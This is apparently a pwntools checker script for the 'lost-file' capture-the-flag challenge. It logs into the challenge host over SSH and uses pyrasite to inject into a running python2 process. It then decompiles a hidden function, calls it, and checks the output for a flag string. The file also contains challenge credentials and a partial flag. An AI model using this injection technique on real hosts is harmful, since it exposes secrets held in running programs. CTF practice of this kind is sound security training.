#!/usr/bin/python3
from pwn import *
import os, hashlib

host = "lost-file.ctf.insecurity-insa.fr"


def alive():
    s = ssh(host=host, user="lost-file", password="lost-file", level="error")
    bash = s.run("bash")
    bash.sendline("ps aux")
    ret = bash.recvline(timeout=1)
    for i in range(9):
        try:
            ret += bash.recvline(timeout=1)
        except:
            break
    bash.sendline('exit')
    assert(b"python" in ret)
    return s, True


def exploitable(s):
    bash = s.run("bash")
    bash.sendline("virtualenv exploit")
    bash.sendline("source exploit/bin/activate")
    bash.sendline("pip install pyrasite uncompyle6")
    bash.sendline("pyrasite-shell $(pidof -s python2)")
    bash.sendline("pyrasite-shell $(pidof -s python2)")
    bash.sendline("import uncompyle6")
    bash.sendline("uncompyle6.main.uncompyle(2.7,x.func_code,sys.stdout)")
    bash.sendline("x(c,'deadbeef')")
    data = bash.recvuntil("backdoor()\\n")
    bash.sendline('exit')
    s.close()
    return b"WpUhe9pcVu1OpGklj" in data

if __name__ == "__main__":
    s, is_alive = alive()
    print(is_alive and exploitable(s))

